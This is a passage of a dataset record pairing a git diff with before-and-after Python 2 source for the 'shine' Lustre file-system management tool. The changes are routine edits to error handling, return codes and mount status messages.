get_nid(self, node):\n         try:\n             return self.nid_map[node]\n         except KeyError:\n-            print \"Cannot get NID for %s, aborting. Please verify `nid_map' configuration.\" % node\n-            # FIXME : raise fatal exception\n-            sys.exit(1)\n+            raise ConfigException(\"Cannot get NID for %s, aborting. Please verify `nid_map' configuration.\" % node)\n \n     def __str__(self):\n         return \">> BACKEND:\\n%s\\n>> MODEL:\\n%s\" % (self.backend, Model.__str__(self))\ndiff --git a/lib/Shine/Controller.py b/lib/Shine/Controller.py\nindex d6f04d2..42955d2 100644\n--- a/lib/Shine/Controller.py\n+++ b/lib/Shine/Controller.py\n@@ -98,29 +98,23 @@ def run_command(self, cmd_args):\n             self.print_help(e.message, e.cmd)\n         except CommandException, e:\n             self.print_error(e.message)\n-            return RC_USER_ERROR\n         except ModelFileIOError, e:\n             print \"Error - %s\" % e.message\n         except ModelFileException, e:\n             print \"ModelFile: %s\" % e\n         except ConfigException, e:\n             print \"Configuration: %s\" % e\n-            return RC_RUNTIME_ERROR\n         # file system\n         except FSRemoteError, e:\n             self.print_error(e)\n             return e.rc\n         except NodeSetParseError, e:\n             self.print_error(\"%s\" % e)\n-            return RC_USER_ERROR\n         except RangeSetParseError, e:\n             self.print_error(\"%s\" % e)\n-            return RC_USER_ERROR\n         except KeyError:\n-            print \"Error - Unrecognized action\"\n-            print\n             raise\n         \n-        return 1\n+        return RC_RUNTIME_ERROR\n \n \ndiff --git a/lib/Shine/Lustre/Actions/Proxies/FSProxyAction.py b/lib/Shine/Lustre/Actions/Proxies/FSProxyAction.py\nindex c918520..b6d09d9 100644\n--- a/lib/Shine/Lustre/Actions/Proxies/FSProxyAction.py\n+++ b/lib/Shine/Lustre/Actions/Proxies/FSProxyAction.py\n@@ -80,9 +80,11 @@ def ev_close(self, worker):\n         \"\"\"\n         # Gather nodes by return code\n         for rc, nodes in worker.iter_retcodes():\n+            # some common remote errors:\n             # rc 127 = command not found\n             # rc 126 = found but not executable\n-            if rc >= 126:\n+            # rc 1 = python failure...\n+            if rc != 0:\n                 # Gather these nodes by buffer\n                 for buffer, nodes in worker.iter_buffers(nodes):\n                     # Handle proxy command error which rc >= 127 and \ndiff --git a/lib/Shine/Lustre/FileSystem.py b/lib/Shine/Lustre/FileSystem.py\nindex 696989d..61c642b 100644\n--- a/lib/Shine/Lustre/FileSystem.py\n+++ b/lib/Shine/Lustre/FileSystem.py\n@@ -592,6 +592,8 @@ def status(self, flags=STATUS_ANY):\n                         target.state = RUNTIME_ERROR\n \n         for target in launched:\n+            if target.state == None:\n+                print target, target.server\n             assert target.state != None\n             targets = rdict.setdefault(target.state, [])\n             targets.append(target)\ndiff --git a/scripts/shine b/scripts/shine\nindex 257a504..201cc39 100755\n--- a/scripts/shine\n+++ b/scripts/shine\n@@ -56,15 +56,18 @@ def main():\n         print \"%s (lib: r%s, script: r%s)\" % (public_version, librev, scrrev)\n         sys.exit(0)\n \n+    rc = 128\n+\n     try:\n         rc = controller.run_command(sys.argv[1:])\n-        sys.exit(rc)\n     except KeyError:\n         usage(controller)\n-        sys.exit(2)\n-    except (KeyboardInterrupt, SystemExit):\n+    except KeyboardInterrupt:\n         print >>sys.stderr, \"Exiting.\"\n-        sys.exit(2)\n+    except SystemExit, e:\n+        rc = r.code or rc\n+\n+    sys.exit(rc)\n         \n \n if __name__ == '__main__':\n", "files": {"/lib/Shine/Commands/CommandRegistry.py": {"changes": [{"diff": "\n         command.parse(new_args)\n \n         # Execute\n-        return command.execute()\n+        rc = command.execute()\n+\n+        # Filter rc\n+        return command.filter_rc(rc)", "add": 4, "remove": 1, "filename": "/lib/Shine/Commands/CommandRegistry.py", "badparts": ["        return command.execute()"], "goodparts": ["        rc = command.execute()", "        return command.filter_rc(rc)"]}], "source": "\n from Base.Command import Command from Shine.Commands import commandList from Exceptions import * class CommandRegistry: \"\"\"Container object to deal with commands.\"\"\" def __init__(self): self.cmd_list=[] self.cmd_dict={} self.cmd_optargs={} self._load() def __len__(self): \"Return the number of commands.\" return len(self.cmd_list) def __iter__(self): \"Iterate over available commands.\" for cmd in self.cmd_list: yield cmd def _load(self): for cmdobj in commandList: self.register(cmdobj()) def get(self, name): return self.cmd_dict[name] def register(self, cmd): \"Register a new command.\" assert isinstance(cmd, Command) self.cmd_list.append(cmd) self.cmd_dict[cmd.get_name()]=cmd opt_len=len(cmd.getopt_string) for i in range(0, opt_len): c=cmd.getopt_string[i] if c==':': continue has_arg=not(i==opt_len -1) and(cmd.getopt_string[i+1]==':') if c in self.cmd_optargs: assert self.cmd_optargs[c]==has_arg, \"Incoherency in option arguments\" else: self.cmd_optargs[c]=has_arg def execute(self, args): \"\"\" Execute a shine script command. \"\"\" command=None new_args=[] try: next_is_arg=False for opt in args: if opt.startswith('-'): new_args.append(opt) next_is_arg=self.cmd_optargs[opt[-1:]] elif next_is_arg: new_args.append(opt) next_is_arg=False else: if command: if command.has_subcommand(): new_args.append(opt) else: raise CommandHelpException(\"Syntax error.\", command) else: command=self.get(opt) next_is_arg=False except KeyError, e: raise CommandNotFoundError(opt) command.parse(new_args) return command.execute() ", "sourceWithComments": "# CommandRegistry.py -- Shine commands registry\n# Copyright (C) 2007, 2009 CEA\n#\n# This file is part of shine\n#\n# This program is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License\n# as published by the Free Software Foundation; either version 2\n# of the License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.\n#\n# $Id$\n\n# Base command class definition\nfrom Base.Command import Command\n\n# Import list of enabled commands (defined in the module __init__.py)\nfrom Shine.Commands import commandList\n\nfrom Exceptions import *\n\n\n# ----------------------------------------------------------------------\n# Command Registry\n# ----------------------------------------------------------------------\n\n\nclass CommandRegistry:\n    \"\"\"Container object to deal with commands.\"\"\"\n\n    def __init__(self):\n        self.cmd_list = []\n        self.cmd_dict = {}\n        self.cmd_optargs = {}\n\n        # Autoload commands\n        self._load()\n\n    def __len__(self):\n        \"Return the number of commands.\"\n        return len(self.cmd_list)\n\n    def __iter__(self):\n        \"Iterate over available commands.\"\n        for cmd in self.cmd_list:\n            yield cmd\n\n    # Private methods\n\n    def _load(self):\n        for cmdobj in commandList:\n            self.register(cmdobj())\n\n    # Public methods\n\n    def get(self, name):\n        return self.cmd_dict[name]\n\n    def register(self, cmd):\n        \"Register a new command.\"\n        assert isinstance(cmd, Command)\n\n        self.cmd_list.append(cmd)\n        self.cmd_dict[cmd.get_name()] = cmd\n\n        # Keep an eye on ALL option arguments, this is to insure a global\n        # options coherency within shine and allow us to intermix options and\n        # command -- see execute() below.\n        opt_len = len(cmd.getopt_string)\n        for i in range(0, opt_len):\n            c = cmd.getopt_string[i]\n            if c == ':':\n                continue\n            has_arg = not (i == opt_len - 1) and (cmd.getopt_string[i+1] == ':')\n            if c in self.cmd_optargs:\n                assert self.cmd_optargs[c] == has_arg, \"Incoherency in option arguments\"\n            else:\n                self.cmd_optargs[c] = has_arg \n\n    def execute(self, args):\n        \"\"\"\n        Execute a shine script command.\n        \"\"\"\n        # Get command and options. Options and command may be intermixed.\n        command = None\n        new_args = []\n        try:\n            # Find command through options...\n            next_is_arg = False\n            for opt in args:\n                if opt.startswith('-'):\n                    new_args.append(opt)\n                    next_is_arg = self.cmd_optargs[opt[-1:]]\n                elif next_is_arg:\n                    new_args.append(opt)\n                    next_is_arg = False\n                else:\n                    if command:\n                        # Command has already been found, so?\n                        if command.has_subcommand():\n                            # The command supports subcommand: keep it in new_args.\n                            new_args.append(opt)\n                        else:\n                            raise CommandHelpException(\"Syntax error.\", command)\n                    else:\n                        command = self.get(opt)\n                    next_is_arg = False\n        except KeyError, e:\n            raise CommandNotFoundError(opt)\n\n        # Parse\n        command.parse(new_args)\n\n        # Execute\n        return command.execute()\n\n"}, "/lib/Shine/Commands/Install.py": {"changes": [{"diff": "\n \n     def execute(self):\n         if not self.opt_m:\n-            print \"Bad argument\"\n+            raise CommandHelpException(\"Lustre model file path (-m <model_file>) argument required.\", self)\n         else:\n             # Use this Shine.FSUtils convenience function.\n             fs_conf, fs = create_lustrefs(self.lmf_support.get_lmf_path(),\n", "add": 1, "remove": 1, "filename": "/lib/Shine/Commands/Install.py", "badparts": ["            print \"Bad argument\""], "goodparts": ["            raise CommandHelpException(\"Lustre model file path (-m <model_file>) argument required.\", self)"]}, {"diff": "\n                 print \"Use `shine format -f %s' to initialize the file system.\" % \\\n                         fs_conf.get_fs_name()\n \n-            return 0\n+            return RC_O", "add": 1, "remove": 1, "filename": "/lib/Shine/Commands/Install.py", "badparts": ["            return 0"], "goodparts": ["            return RC_O"]}], "source": "\n from Shine.Configuration.Configuration import Configuration from Shine.Configuration.Globals import Globals from Shine.FSUtils import create_lustrefs from Base.Command import Command from Base.Support.LMF import LMF from Base.Support.Nodes import Nodes class Install(Command): \"\"\" shine install -f /path/to/model.lmf \"\"\" def __init__(self): Command.__init__(self) self.lmf_support=LMF(self) self.nodes_support=Nodes(self) def get_name(self): return \"install\" def get_desc(self): return \"Install a new file system.\" def execute(self): if not self.opt_m: print \"Bad argument\" else: fs_conf, fs=create_lustrefs(self.lmf_support.get_lmf_path(), event_handler=self) install_nodes=self.nodes_support.get_nodeset() fs.install(fs_conf.get_cfg_filename(), nodes=install_nodes) if install_nodes: nodestr=\" on %s\" % install_nodes else: nodestr=\"\" print \"Configuration files for file system %s have been installed \" \\ \"successfully%s.\" %(fs_conf.get_fs_name(), nodestr) if not install_nodes: print print \"Lustre targets summary:\" print \"\\t%d MGT on %s\" %(fs.mgt_count, fs.mgt_servers) print \"\\t%d MDT on %s\" %(fs.mdt_count, fs.mdt_servers) print \"\\t%d OST on %s\" %(fs.ost_count, fs.ost_servers) print print \"Use `shine format -f %s' to initialize the file system.\" % \\ fs_conf.get_fs_name() return 0 ", "sourceWithComments": "# Install.py -- File system installation commands\n# Copyright (C) 2007, 2008, 2009 CEA\n#\n# This file is part of shine\n#\n# This program is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License\n# as published by the Free Software Foundation; either version 2\n# of the License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.\n#\n# $Id$\n\nfrom Shine.Configuration.Configuration import Configuration\nfrom Shine.Configuration.Globals import Globals \n\nfrom Shine.FSUtils import create_lustrefs\n\nfrom Base.Command import Command\nfrom Base.Support.LMF import LMF\nfrom Base.Support.Nodes import Nodes\n\n\nclass Install(Command):\n    \"\"\"\n    shine install -f /path/to/model.lmf\n    \"\"\"\n    \n    def __init__(self):\n        Command.__init__(self)\n\n        self.lmf_support = LMF(self)\n        self.nodes_support = Nodes(self)\n\n    def get_name(self):\n        return \"install\"\n\n    def get_desc(self):\n        return \"Install a new file system.\"\n\n    def execute(self):\n        if not self.opt_m:\n            print \"Bad argument\"\n        else:\n            # Use this Shine.FSUtils convenience function.\n            fs_conf, fs = create_lustrefs(self.lmf_support.get_lmf_path(),\n                    event_handler=self)\n\n            install_nodes = self.nodes_support.get_nodeset()\n\n            # Install file system configuration files; normally, this should\n            # not be done by the Shine.Lustre.FileSystem object itself, but as\n            # all proxy methods are currently handled by it, it is more\n            # convenient this way...\n            fs.install(fs_conf.get_cfg_filename(), nodes=install_nodes)\n\n            if install_nodes:\n                nodestr = \" on %s\" %  install_nodes\n            else:\n                nodestr = \"\"\n\n            print \"Configuration files for file system %s have been installed \" \\\n                    \"successfully%s.\" % (fs_conf.get_fs_name(), nodestr)\n\n            if not install_nodes:\n                # Print short file system summary.\n                print\n                print \"Lustre targets summary:\"\n                print \"\\t%d MGT on %s\" % (fs.mgt_count, fs.mgt_servers)\n                print \"\\t%d MDT on %s\" % (fs.mdt_count, fs.mdt_servers)\n                print \"\\t%d OST on %s\" % (fs.ost_count, fs.ost_servers)\n                print\n\n                # Give pointer to next user step.\n                print \"Use `shine format -f %s' to initialize the file system.\" % \\\n                        fs_conf.get_fs_name()\n\n            return 0\n\n"}, "/lib/Shine/Commands/Mount.py": {"changes": [{"diff": "\n     def ev_startclient_done(self, node, client):\n         if self.verbose > 1:\n             if client.status_info:\n-                print \"%s: Mount: %s\" % (node, client.status_info)\n+                print \"%s: Mount %s: %s\" % (node, client.fs.fs_name, client.status_info)\n             else:\n                 print \"%s: FS %s succesfully mounted on %s\" % (node,\n                         client.fs.fs_name, client.mount_path)\n", "add": 1, "remove": 1, "filename": "/lib/Shine/Commands/Mount.py", "badparts": ["                print \"%s: Mount: %s\" % (node, client.status_info)"], "goodparts": ["                print \"%s: Mount %s: %s\" % (node, client.fs.fs_name, client.status_info)"]}, {"diff": "\n \n             fs.set_debug(self.debug_support.has_debug())\n \n+            if not self.remote_call and vlevel > 0:\n+                if nodes:\n+                    m_nodes = nodes.intersection(fs.get_client_servers())\n+                else:\n+                    m_nodes = fs.get_client_servers()\n+                print \"Starting %s clients on %s...\" % (fs.fs_name, m_nodes)\n+\n             status = fs.mount(mount_options=fs_conf.get_mount_options())\n             rc = self.fs_status_to_rc(status)\n             if rc > result:\n                 result = rc\n \n-            if rc == RC_OK:\n-                if vlevel > 0:\n-                    print \"Mount successful.\"\n-            elif rc == RC_RUNTIME_ERROR:\n-                for nodes, msg in fs.proxy_errors:\n-                    print \"%s: %s\" % (nodes, msg)\n+            if not self.remote_call:\n+                if rc == RC_OK:\n+                    if vlevel > 0:\n+                        # m_nodes is defined if not self.remote_call and vlevel > 0\n+                        print \"Mount successful on %s\" % m_nodes\n+                elif rc == RC_RUNTIME_ERROR:\n+                    for nodes, msg in fs.proxy_errors:\n+                        print \"%s: %s\" % (nodes, msg)\n \n         return resu", "add": 15, "remove": 6, "filename": "/lib/Shine/Commands/Mount.py", "badparts": ["            if rc == RC_OK:", "                if vlevel > 0:", "                    print \"Mount successful.\"", "            elif rc == RC_RUNTIME_ERROR:", "                for nodes, msg in fs.proxy_errors:", "                    print \"%s: %s\" % (nodes, msg)"], "goodparts": ["            if not self.remote_call and vlevel > 0:", "                if nodes:", "                    m_nodes = nodes.intersection(fs.get_client_servers())", "                else:", "                    m_nodes = fs.get_client_servers()", "                print \"Starting %s clients on %s...\" % (fs.fs_name, m_nodes)", "            if not self.remote_call:", "                if rc == RC_OK:", "                    if vlevel > 0:", "                        print \"Mount successful on %s\" % m_nodes", "                elif rc == RC_RUNTIME_ERROR:", "                    for nodes, msg in fs.proxy_errors:", "                        print \"%s: %s\" % (nodes, msg)"]}], "source": "\n \"\"\" Shine `mount' command classes. The mount command aims to start Lustre filesystem clients. \"\"\" import os from Shine.Configuration.Configuration import Configuration from Shine.Configuration.Globals import Globals from Shine.Configuration.Exceptions import * from Base.FSClientLiveCommand import FSClientLiveCommand from Base.CommandRCDefs import * from Base.RemoteCallEventHandler import RemoteCallEventHandler from Exceptions import CommandException from Shine.FSUtils import open_lustrefs import Shine.Lustre.EventHandler from Shine.Lustre.FileSystem import * class GlobalMountEventHandler(Shine.Lustre.EventHandler.EventHandler): def __init__(self, verbose=1): self.verbose=verbose def ev_startclient_start(self, node, client): if self.verbose > 1: print \"%s: Mounting %s on %s...\" %(node, client.fs.fs_name, client.mount_path) def ev_startclient_done(self, node, client): if self.verbose > 1: if client.status_info: print \"%s: Mount: %s\" %(node, client.status_info) else: print \"%s: FS %s succesfully mounted on %s\" %(node, client.fs.fs_name, client.mount_path) def ev_startclient_failed(self, node, client, rc, message): if rc: strerr=os.strerror(rc) else: strerr=message print \"%s: Failed to mount FS %s on %s: %s\" % \\ (node, client.fs.fs_name, client.mount_path, strerr) if rc: print message class Mount(FSClientLiveCommand): \"\"\" \"\"\" def __init__(self): FSClientLiveCommand.__init__(self) def get_name(self): return \"mount\" def get_desc(self): return \"Mount file system clients.\" target_status_rc_map={ \\ MOUNTED: RC_OK, RECOVERING: RC_FAILURE, OFFLINE: RC_FAILURE, TARGET_ERROR: RC_TARGET_ERROR, CLIENT_ERROR: RC_CLIENT_ERROR, RUNTIME_ERROR: RC_RUNTIME_ERROR} def fs_status_to_rc(self, status): return self.target_status_rc_map[status] def execute(self): result=0 self.init_execute() vlevel=self.verbose_support.get_verbose_level() for fsname in self.fs_support.iter_fsname(): eh=self.install_eventhandler(None, GlobalMountEventHandler(vlevel)) nodes=self.nodes_support.get_nodeset() fs_conf, fs=open_lustrefs(fsname, None, nodes=nodes, indexes=None, event_handler=eh) if nodes and not nodes.issubset(fs_conf.get_client_nodes()): raise CommandException(\"%s are not client nodes of filesystem '%s'\" % \\ (nodes -fs_conf.get_client_nodes(), fsname)) fs.set_debug(self.debug_support.has_debug()) status=fs.mount(mount_options=fs_conf.get_mount_options()) rc=self.fs_status_to_rc(status) if rc > result: result=rc if rc==RC_OK: if vlevel > 0: print \"Mount successful.\" elif rc==RC_RUNTIME_ERROR: for nodes, msg in fs.proxy_errors: print \"%s: %s\" %(nodes, msg) return result ", "sourceWithComments": "# Mount.py -- Mount file system on clients\n# Copyright (C) 2007, 2008, 2009 CEA\n#\n# This file is part of shine\n#\n# This program is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License\n# as published by the Free Software Foundation; either version 2\n# of the License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.\n#\n# $Id$\n\n\"\"\"\nShine `mount' command classes.\n\nThe mount command aims to start Lustre filesystem clients.\n\"\"\"\n\nimport os\n\n# Configuration\nfrom Shine.Configuration.Configuration import Configuration\nfrom Shine.Configuration.Globals import Globals \nfrom Shine.Configuration.Exceptions import *\n\n# Command base class\nfrom Base.FSClientLiveCommand import FSClientLiveCommand\nfrom Base.CommandRCDefs import *\n# -R handler\nfrom Base.RemoteCallEventHandler import RemoteCallEventHandler\n\nfrom Exceptions import CommandException\n\n# Command helper\nfrom Shine.FSUtils import open_lustrefs\n\n# Lustre events\nimport Shine.Lustre.EventHandler\nfrom Shine.Lustre.FileSystem import *\n\nclass GlobalMountEventHandler(Shine.Lustre.EventHandler.EventHandler):\n\n    def __init__(self, verbose=1):\n        self.verbose = verbose\n\n    def ev_startclient_start(self, node, client):\n        if self.verbose > 1:\n            print \"%s: Mounting %s on %s ...\" % (node, client.fs.fs_name, client.mount_path)\n\n    def ev_startclient_done(self, node, client):\n        if self.verbose > 1:\n            if client.status_info:\n                print \"%s: Mount: %s\" % (node, client.status_info)\n            else:\n                print \"%s: FS %s succesfully mounted on %s\" % (node,\n                        client.fs.fs_name, client.mount_path)\n\n    def ev_startclient_failed(self, node, client, rc, message):\n        if rc:\n            strerr = os.strerror(rc)\n        else:\n            strerr = message\n        print \"%s: Failed to mount FS %s on %s: %s\" % \\\n                (node, client.fs.fs_name, client.mount_path, strerr)\n        if rc:\n            print message\n\n\nclass Mount(FSClientLiveCommand):\n    \"\"\"\n    \"\"\"\n\n    def __init__(self):\n        FSClientLiveCommand.__init__(self)\n\n    def get_name(self):\n        return \"mount\"\n\n    def get_desc(self):\n        return \"Mount file system clients.\"\n\n    target_status_rc_map = { \\\n            MOUNTED : RC_OK,\n            RECOVERING : RC_FAILURE,\n            OFFLINE : RC_FAILURE,\n            TARGET_ERROR : RC_TARGET_ERROR,\n            CLIENT_ERROR : RC_CLIENT_ERROR,\n            RUNTIME_ERROR : RC_RUNTIME_ERROR }\n\n    def fs_status_to_rc(self, status):\n        return self.target_status_rc_map[status]\n\n    def execute(self):\n        result = 0\n\n        self.init_execute()\n\n        # Get verbose level.\n        vlevel = self.verbose_support.get_verbose_level()\n\n        for fsname in self.fs_support.iter_fsname():\n\n            # Install appropriate event handler.\n            eh = self.install_eventhandler(None,\n                    GlobalMountEventHandler(vlevel))\n\n            nodes = self.nodes_support.get_nodeset()\n\n            fs_conf, fs = open_lustrefs(fsname, None,\n                    nodes=nodes,\n                    indexes=None,\n                    event_handler=eh)\n\n            if nodes and not nodes.issubset(fs_conf.get_client_nodes()):\n                raise CommandException(\"%s are not client nodes of filesystem '%s'\" % \\\n                        (nodes - fs_conf.get_client_nodes(), fsname))\n\n            fs.set_debug(self.debug_support.has_debug())\n\n            status = fs.mount(mount_options=fs_conf.get_mount_options())\n            rc = self.fs_status_to_rc(status)\n            if rc > result:\n                result = rc\n\n            if rc == RC_OK:\n                if vlevel > 0:\n                    print \"Mount successful.\"\n            elif rc == RC_RUNTIME_ERROR:\n                for nodes, msg in fs.proxy_errors:\n                    print \"%s: %s\" % (nodes, msg)\n\n        return result\n\n"}, "/lib/Shine/Commands/Preinstall.py": {"changes": [{"diff": "\n             if not os.path.exists(conf_dir_path):\n                 os.makedirs(conf_dir_path, 0755)\n         except OSError, ex:\n-            print \"OSError\"\n-            raise\n+            print \"OSError %s\" % ex\n+            return RC_RUNTIME_ERROR\n \n+        return ", "add": 3, "remove": 2, "filename": "/lib/Shine/Commands/Preinstall.py", "badparts": ["            print \"OSError\"", "            raise"], "goodparts": ["            print \"OSError %s\" % ex", "            return RC_RUNTIME_ERROR", "        return "]}], "source": "\n from Shine.Configuration.Configuration import Configuration from Shine.Configuration.Globals import Globals from Shine.Configuration.Exceptions import * from Shine.FSUtils import create_lustrefs from Base.RemoteCommand import RemoteCommand from Base.Support.FS import FS import os class Preinstall(RemoteCommand): \"\"\" shine preinstall -f <filesystem name> -R \"\"\" def __init__(self): RemoteCommand.__init__(self) self.fs_support=FS(self) def get_name(self): return \"preinstall\" def get_desc(self): return \"Preinstall a new file system.\" def is_hidden(self): return True def execute(self): try: conf_dir_path=Globals().get_conf_dir() if not os.path.exists(conf_dir_path): os.makedirs(conf_dir_path, 0755) except OSError, ex: print \"OSError\" raise ", "sourceWithComments": "# Preinstall.py -- File system installation commands\n# Copyright (C) 2007, 2008 CEA\n#\n# This file is part of shine\n#\n# This program is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License\n# as published by the Free Software Foundation; either version 2\n# of the License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.\n#\n# $Id$\n\nfrom Shine.Configuration.Configuration import Configuration\nfrom Shine.Configuration.Globals import Globals \nfrom Shine.Configuration.Exceptions import *\n\nfrom Shine.FSUtils import create_lustrefs\n\nfrom Base.RemoteCommand import RemoteCommand\nfrom Base.Support.FS import FS\n\nimport os\n\nclass Preinstall(RemoteCommand):\n    \"\"\"\n    shine preinstall -f <filesystem name> -R\n    \"\"\"\n    \n    def __init__(self):\n        RemoteCommand.__init__(self)\n        self.fs_support = FS(self)\n\n    def get_name(self):\n        return \"preinstall\"\n\n    def get_desc(self):\n        return \"Preinstall a new file system.\"\n\n    def is_hidden(self):\n        return True\n\n    def execute(self):\n        try:\n            conf_dir_path = Globals().get_conf_dir()\n            if not os.path.exists(conf_dir_path):\n                os.makedirs(conf_dir_path, 0755)\n        except OSError, ex:\n            print \"OSError\"\n            raise\n\n"}, "/lib/Shine/Commands/Start.py": {"changes": [{"diff": "\n             if hasattr(eh, 'post'):\n                 eh.post(fs)\n \n-            return rc\n+        return ", "add": 1, "remove": 1, "filename": "/lib/Shine/Commands/Start.py", "badparts": ["            return rc"], "goodparts": ["        return "]}], "source": "\n \"\"\" Shine `start' command classes. The start command aims to start Lustre filesystem servers or just some of the filesystem targets on local or remote servers. It is available for any filesystems previously installed and formatted. \"\"\" import os from Shine.Configuration.Configuration import Configuration from Shine.Configuration.Globals import Globals from Shine.Configuration.Exceptions import * from Shine.Commands.Status import Status from Shine.Commands.Tune import Tune from Base.FSLiveCommand import FSLiveCommand from Base.FSEventHandler import FSGlobalEventHandler from Base.CommandRCDefs import * from Base.RemoteCallEventHandler import RemoteCallEventHandler from Shine.FSUtils import open_lustrefs import Shine.Lustre.EventHandler from Shine.Lustre.Actions.Proxies.ProxyAction import * from Shine.Lustre.FileSystem import * class GlobalStartEventHandler(FSGlobalEventHandler): def __init__(self, verbose=1): FSGlobalEventHandler.__init__(self, verbose) def handle_pre(self, fs): if self.verbose > 0: print \"Starting %d targets on %s\" %(fs.target_count, fs.target_servers) def handle_post(self, fs): if self.verbose > 0: Status.status_view_fs(fs, show_clients=False) def ev_starttarget_start(self, node, target): if self.verbose > 1: print \"%s: Starting %s %s(%s)...\" %(node, \\ target.type.upper(), target.get_id(), target.dev) self.update() def ev_starttarget_done(self, node, target): self.status_changed=True if self.verbose > 1: if target.status_info: print \"%s: Start of %s %s(%s): %s\" % \\ (node, target.type.upper(), target.get_id(), target.dev, target.status_info) else: print \"%s: Start of %s %s(%s) succeeded\" % \\ (node, target.type.upper(), target.get_id(), target.dev) self.update() def ev_starttarget_failed(self, node, target, rc, message): self.status_changed=True if rc: strerr=os.strerror(rc) else: strerr=message print \"%s: Failed to start %s %s(%s): %s\" % \\ (node, target.type.upper(), target.get_id(), target.dev, strerr) if rc: print message self.update() class LocalStartEventHandler(Shine.Lustre.EventHandler.EventHandler): def __init__(self, verbose=1): self.verbose=verbose def ev_starttarget_start(self, node, target): if self.verbose > 1: print \"Starting %s %s(%s)...\" %(target.type.upper(), target.get_id(), target.dev) def ev_starttarget_done(self, node, target): if self.verbose > 1: if target.status_info: print \"Start of %s %s(%s): %s\" %(target.type.upper(), target.get_id(), target.dev, target.status_info) else: print \"Start of %s %s(%s) succeeded\" %(target.type.upper(), target.get_id(), target.dev) def ev_starttarget_failed(self, node, target, rc, message): if rc: strerr=os.strerror(rc) else: strerr=message print \"Failed to start %s %s(%s): %s\" %(target.type.upper(), target.get_id(), target.dev, strerr) if rc: print message class Start(FSLiveCommand): \"\"\" shine start[-f <fsname>][-t <target>][-i <index(es)>][-n <nodes>][-qv] \"\"\" def __init__(self): FSLiveCommand.__init__(self) def get_name(self): return \"start\" def get_desc(self): return \"Start file system servers.\" target_status_rc_map={ \\ MOUNTED: RC_OK, RECOVERING: RC_OK, OFFLINE: RC_FAILURE, TARGET_ERROR: RC_TARGET_ERROR, CLIENT_ERROR: RC_CLIENT_ERROR, RUNTIME_ERROR: RC_RUNTIME_ERROR} def fs_status_to_rc(self, status): return self.target_status_rc_map[status] def execute(self): result=0 self.init_execute() vlevel=self.verbose_support.get_verbose_level() target=self.target_support.get_target() for fsname in self.fs_support.iter_fsname(): eh=self.install_eventhandler(LocalStartEventHandler(vlevel), GlobalStartEventHandler(vlevel)) fs_conf, fs=open_lustrefs(fsname, target, nodes=self.nodes_support.get_nodeset(), indexes=self.indexes_support.get_rangeset(), event_handler=eh) mount_options={} mount_paths={} for target_type in[ 'mgt', 'mdt', 'ost']: mount_options[target_type]=fs_conf.get_target_mount_options(target_type) mount_paths[target_type]=fs_conf.get_target_mount_path(target_type) fs.set_debug(self.debug_support.has_debug()) if hasattr(eh, 'pre'): eh.pre(fs) status=fs.start(mount_options=mount_options, mount_paths=mount_paths) rc=self.fs_status_to_rc(status) if rc > result: result=rc if rc==RC_OK: if vlevel > 0: print \"Start successful.\" tuning=Tune.get_tuning(fs_conf) status=fs.tune(tuning) if status==RUNTIME_ERROR: rc=RC_RUNTIME_ERROR if rc==RC_RUNTIME_ERROR: for nodes, msg in fs.proxy_errors: print \"%s: %s\" %(nodes, msg) if hasattr(eh, 'post'): eh.post(fs) return rc ", "sourceWithComments": "# Start.py -- Start file system\n# Copyright (C) 2007, 2008, 2009 CEA\n#\n# This file is part of shine\n#\n# This program is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License\n# as published by the Free Software Foundation; either version 2\n# of the License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.\n#\n# $Id$\n\n\"\"\"\nShine `start' command classes.\n\nThe start command aims to start Lustre filesystem servers or just some\nof the filesystem targets on local or remote servers. It is available\nfor any filesystems previously installed and formatted.\n\"\"\"\n\nimport os\n\n# Configuration\nfrom Shine.Configuration.Configuration import Configuration\nfrom Shine.Configuration.Globals import Globals \nfrom Shine.Configuration.Exceptions import *\n\nfrom Shine.Commands.Status import Status\nfrom Shine.Commands.Tune import Tune\n\n# Command base class\nfrom Base.FSLiveCommand import FSLiveCommand\nfrom Base.FSEventHandler import FSGlobalEventHandler\nfrom Base.CommandRCDefs import *\n# -R handler\nfrom Base.RemoteCallEventHandler import RemoteCallEventHandler\n\n# Command helper\nfrom Shine.FSUtils import open_lustrefs\n\n# Lustre events\nimport Shine.Lustre.EventHandler\n\n# Shine Proxy Protocol\nfrom Shine.Lustre.Actions.Proxies.ProxyAction import *\nfrom Shine.Lustre.FileSystem import 